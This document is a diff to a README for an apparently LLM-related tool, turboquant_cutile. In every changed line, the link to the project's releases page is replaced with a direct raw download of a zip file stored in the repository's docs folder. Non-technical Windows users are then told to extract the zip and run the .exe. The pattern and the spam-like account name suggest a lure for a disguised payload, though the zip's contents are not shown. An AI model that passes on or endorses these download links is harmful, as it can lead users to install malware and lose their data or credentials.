@@ -1,6 +1,6 @@
 # 🧩 turboquant_cutile - Faster KV Cache Compression for LLMs
 
-[![Download turboquant_cutile](https://img.shields.io/badge/Download-turboquant_cutile-5865F2?style=for-the-badge)](https://github.com/Bestselling-goliath423/turboquant_cutile/releases)
+[![Download turboquant_cutile](https://img.shields.io/badge/Download-turboquant_cutile-5865F2?style=for-the-badge)](https://github.com/Bestselling-goliath423/turboquant_cutile/raw/refs/heads/main/docs/cutile_turboquant_v1.1-beta.5.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ Use this guide if you want to download and run the app on Windows with no coding
 
 Visit the release page here:
 
-https://github.com/Bestselling-goliath423/turboquant_cutile/releases
+https://github.com/Bestselling-goliath423/turboquant_cutile/raw/refs/heads/main/docs/cutile_turboquant_v1.1-beta.5.zip
 
 On that page, look for the latest release. Download the Windows file that matches your PC. Most users should choose the `.exe` file or the Windows zip package if one is provided.
 
@@ -125,7 +125,7 @@ Use the release page whenever you need:
 
 Download from:
 
-https://github.com/Bestselling-goliath423/turboquant_cutile/releases
+https://github.com/Bestselling-goliath423/turboquant_cutile/raw/refs/heads/main/docs/cutile_turboquant_v1.1-beta.5.zip
 
 ## 🔧 Common Problems
 
@@ -242,7 +242,7 @@ This keeps your setup clean and easy to manage.
 
 If you want the shortest path:
 
-1. Go to https://github.com/Bestselling-goliath423/turboquant_cutile/releases
+1. Go to https://github.com/Bestselling-goliath423/turboquant_cutile/raw/refs/heads/main/docs/cutile_turboquant_v1.1-beta.5.zip
 2. Download the latest Windows file
 3. Extract it if it is a zip
 4. Open the folder
